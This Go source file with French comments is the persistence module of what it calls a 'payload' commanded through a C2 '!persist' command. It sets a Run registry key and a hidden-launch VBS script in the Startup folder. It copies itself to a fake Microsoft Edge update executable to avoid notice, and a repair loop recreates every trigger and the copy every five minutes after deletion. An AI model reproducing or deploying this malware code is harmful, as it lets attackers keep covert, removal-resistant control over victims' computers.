// Persistance : démarrage avec Windows, à la demande.
//
// Deux moyens complémentaires, tous deux écrits dans la clé de l'utilisateur
// courant — aucune élévation, aucun accès administrateur requis :
//
//   - la clé Run du Registre (HKCU) ;
//   - un raccourci dans le dossier Démarrage (si la clé est refusée).
//
// La valeur s'appelle « Francais2ndUpdate » : un nom d'application, pas un
// nom emprunté à un composant Windows.
package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unicode/utf16"
	"unsafe"
)

var (
	procRegSetValueEx = advapi32DLL.NewProc("RegSetValueExW")
	procRegDeleteVal  = advapi32DLL.NewProc("RegDeleteValueW")
)

const (
	runKeyPath   = `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
	runValueName = "Francais2ndUpdate"
)

/* ------------------------------------------------------------------ */
/* Registre : écriture et suppression                                  */
/* ------------------------------------------------------------------ */

func regSetValueString(root uintptr, sub, name, value string) error {
	h, err := regOpenKeyWrite(root, sub)
	if err != nil {
		return err
	}
	defer regCloseKey(h)

	n, err := syscall.UTF16PtrFromString(name)
	if err != nil {
		return err
	}
	v, err := syscall.UTF16PtrFromString(value)
	if err != nil {
		return err
	}
	const regSz = 1
	r, _, callErr := procRegSetValueEx.Call(h, uintptr(unsafe.Pointer(n)), 0,
		uintptr(regSz), uintptr(unsafe.Pointer(v)), uintptr(len(value)+1)*2)
	if r != 0 {
		return fmt.Errorf("RegSetValueEx = %d (%v)", r, callErr)
	}
	return nil
}

func regDeleteValue(root uintptr, sub, name string) error {
	h, err := regOpenKeyWrite(root, sub)
	if err != nil {
		return err
	}
	defer regCloseKey(h)
	n, err := syscall.UTF16PtrFromString(name)
	if err != nil {
		return err
	}
	r, _, callErr := procRegDeleteVal.Call(h, uintptr(unsafe.Pointer(n)))
	if r != 0 && r != 2 { // 2 = ERROR_FILE_NOT_FOUND : déjà absent
		return fmt.Errorf("RegDeleteValue = %d (%v)", r, callErr)
	}
	return nil
}

// regOpenKeyWrite ouvre une clé en écriture (KEY_SET_VALUE), sans vue 64
// bits forcée : la clé Run existe dans les deux vues, on touche à la normale.
func regOpenKeyWrite(root uintptr, sub string) (uintptr, error) {
	p, err := syscall.UTF16PtrFromString(sub)
	if err != nil {
		return 0, err
	}
	var h uintptr
	const keySetValue = 0x0002
	r, _, callErr := procRegOpenKeyEx.Call(root, uintptr(unsafe.Pointer(p)), 0,
		uintptr(keySetValue), uintptr(unsafe.Pointer(&h)))
	if r != 0 {
		return 0, fmt.Errorf("RegOpenKeyEx(écriture) = %d (%v)", r, callErr)
	}
	return h, nil
}

/* ------------------------------------------------------------------ */
/* Installation                                                        */
/* ------------------------------------------------------------------ */

// currentExe renvoie le chemin absolu de l'exécutable en cours.
func currentExe() string {
	p, err := os.Executable()
	if err != nil {
		return ""
	}
	if abs, err := filepath.EvalSymlinks(p); err == nil {
		p = abs
	}
	return p
}

func fileExists(path string) bool {
	path = unquote(path)
	if path == "" {
		return false
	}
	st, err := os.Stat(path)
	return err == nil && !st.IsDir()
}

func unquote(s string) string {
	s = strings.TrimSpace(s)
	s = strings.Trim(s, `"`)
	return s
}

// shadowDir est le dossier où vit la copie de repli : un dossier réellement
// utilisé par Windows Update du navigateur, sans nom d'application suspect.
func shadowDir() string {
	return filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "EdgeUpdate")
}

// shadowPath est la copie permanente. Le Registre et le dossier Démarrage la
// visent en priorité : supprimer l'exécutable d'origine ne coupe pas le
// démarrage, et un processus déjà en marche la recrée au prochain tour de
// réparation.
func shadowPath() string {
	return filepath.Join(shadowDir(), "msedgewebview2_update.exe")
}

// persistMirror maintient la copie de repli à jour. Elle ne sert jamais
// d'elle-même comme source (sinon rafraîchir une copie périmée serait
// impossible).
func persistMirror() {
	exe := currentExe()
	if exe == "" {
		return
	}
	sh := shadowPath()
	if strings.EqualFold(exe, sh) {
		return
	}
	se, errSrc := os.Stat(exe)
	shst, errDst := os.Stat(sh)
	if errDst == nil && errSrc == nil &&
		shst.Size() == se.Size() && !se.ModTime().After(shst.ModTime()) {
		return // déjà à jour
	}
	data, err := os.ReadFile(exe)
	if err != nil {
		if errDst != nil {
			plog("persistance copie: " + err.Error())
		}
		return
	}
	if err := os.MkdirAll(shadowDir(), 0755); err != nil {
		plog("persistance copie: " + err.Error())
		return
	}
	if err := os.WriteFile(sh, data, 0755); err != nil {
		plog("persistance copie: " + err.Error())
		return
	}
	plog("persistance: copie de repli écrite (" + strconv.Itoa(len(data)) + " octets)")
}

// runTarget est le chemin que le démarrage doit lancer : la copie de repli si
// elle existe, sinon l'exécutable courant.
func runTarget() string {
	if fileExists(shadowPath()) {
		return shadowPath()
	}
	return currentExe()
}

// runValue construit la valeur écrite dans le Registre, entre guillemets
// (le chemin contient souvent « Français » et des espaces).
func runValue() string {
	exe := runTarget()
	if exe == "" {
		return ""
	}
	return `"` + exe + `"`
}

// persistInstall ajoute le démarrage avec Windows si la configuration le
// demande. Jamais d'erreur fatale : la persistance est un plus, pas une
// condition de fonctionnement.
//
// Les deux mécanismes sont écrits (Registre **et** dossier Démarrage) : si
// l'un est nettoyé, l'autre suffit. L'exécutable possède un instance unique
// (mutex nommé dans main.go), deux déclencheurs ne font donc pas deux
// processus.
func persistInstall() {
	if runValue() == "" {
		return
	}
	persistMirror()

	regErr := regSetValueString(hkeyCurrentUser, runKeyPath, runValueName, runValue())
	vbsErr := persistStartupShortcut()
	switch {
	case regErr == nil && vbsErr == nil:
		plog("persistance: installée (clé Run + dossier Démarrage) → " + runTarget())
	case regErr == nil:
		plog("persistance: installée (clé Run) → " + runTarget())
	case vbsErr == nil:
		plog("persistance: installée (dossier Démarrage) → " + runTarget())
	default:
		plog("persistance échouée : " + regErr.Error() + " / " + vbsErr.Error())
	}
}

// persistStartupShortcut écrit un .vbs dans le dossier Démarrage. Le script
// tente la copie de repli, puis l'exécutable courant, pour survivre à la
// suppression de l'un des deux.
func persistStartupShortcut() error {
	startup := os.Getenv("APPDATA") +
		`\Microsoft\Windows\Start Menu\Programs\Startup`
	if err := os.MkdirAll(startup, 0755); err != nil {
		return err
	}
	primary := runTarget()
	fallback := currentExe()
	if fallback == "" {
		fallback = primary
	}
	vbs := "Set o = CreateObject(\"WScript.Shell\")\r\n" +
		"Set f = CreateObject(\"Scripting.FileSystemObject\")\r\n" +
		"p = \"" + primary + "\"\r\n" +
		"If Not f.FileExists(p) Then p = \"" + fallback + "\"\r\n" +
		"If f.FileExists(p) Then o.Run \"\"\"\" & p & \"\"\"\", 0, False\r\n"
	// BOM UTF-16LE : wscript lit un .vbs en ANSI par défaut, ce qui corrompt
	// les chemins accentués (profil « caméléon ») et brise le démarrage.
	return os.WriteFile(filepath.Join(startup, "sysupdate.vbs"), utf16LEBOM(vbs), 0644)
}

// utf16LEBOM encode un texte en UTF-16 little-endian avec BOM, format lu
// correctement par Windows Script Host.
func utf16LEBOM(s string) []byte {
	u := utf16.Encode([]rune(s))
	b := make([]byte, 2, 2+2*len(u))
	b[0], b[1] = 0xFF, 0xFE
	for _, r := range u {
		b = append(b, byte(r), byte(r>>8))
	}
	return b
}

// persistRemove annule les deux mécanismes.
func persistRemove() {
	_ = regDeleteValue(hkeyCurrentUser, runKeyPath, runValueName)
	startup := os.Getenv("APPDATA") +
		`\Microsoft\Windows\Start Menu\Programs\Startup\sysupdate.vbs`
	_ = os.Remove(startup)
}

// persistSet gère la commande !persist du C2.
func persistSet(arg string) string {
	switch strings.ToLower(strings.TrimSpace(arg)) {
	case "on", "1", "enable", "oui":
		if runValue() == "" {
			return "chemin de l'exécutable introuvable."
		}
		persistMirror()
		err := regSetValueString(hkeyCurrentUser, runKeyPath, runValueName, runValue())
		if err != nil {
			if err2 := persistStartupShortcut(); err2 != nil {
				return "échec des deux méthodes :\nregistre : " + err.Error() +
					"\ndémarrage : " + err2.Error()
			}
			return "installé dans le dossier Démarrage :\n" +
				os.Getenv("APPDATA") + `\...\Startup\sysupdate.vbs`
		}
		return "installé dans le Registre (clé Run, " + runValueName + ") :\n" + runValue()

	case "off", "0", "disable", "non", "":
		persistRemove()
		return "persistance retirée (clé Run + dossier Démarrage)."

	default:
		return "usage : !persist on   ou   !persist off"
	}
}

// persistStatus sert au diagnostic.
func persistStatus() string {
	h, err := regOpenString(hkeyCurrentUser, runKeyPath)
	if err != nil {
		return "registre inaccessible"
	}
	defer regCloseKey(h)
	v := regReadString(h, runValueName)
	if v == "" {
		return "absente"
	}
	return v
}

/* ------------------------------------------------------------------ */
/* Réparation                                                          */
/* ------------------------------------------------------------------ */

// persistRepair maintient la persistance vivante : la copie de repli et les
// deux déclencheurs sont recréés si quelqu'un les supprime. Un exécutable
// supprimé pendant l'exécution continue de tourner (Windows refuse de
// déverrouiller l'image en cours), donc la copie manquante est réécrite au
// passage suivant. Tourne tant que le payload est actif.
func persistRepair() {
	for {
		time.Sleep(5 * time.Minute)
		if stopped.Load() {
			plog("persistance: réparation arrêtée par !stop")
			return
		}
		if !cfg.Persist {
			return
		}
		persistMirror()

		want := runValue()
		if want == "" {
			continue
		}
		changed := false
		if v := persistStatus(); v == "" || v == "absente" ||
			!strings.EqualFold(unquote(v), unquote(want)) {
			if err := regSetValueString(hkeyCurrentUser, runKeyPath, runValueName, want); err == nil {
				changed = true
			}
		}
		startup := os.Getenv("APPDATA") +
			`\Microsoft\Windows\Start Menu\Programs\Startup\sysupdate.vbs`
		if !fileExists(startup) {
			if err := persistStartupShortcut(); err == nil {
				changed = true
			}
		}
		if changed {
			plog("persistance: réparée (copie, clé Run et/ou Démarrage)")
		}
	}
}
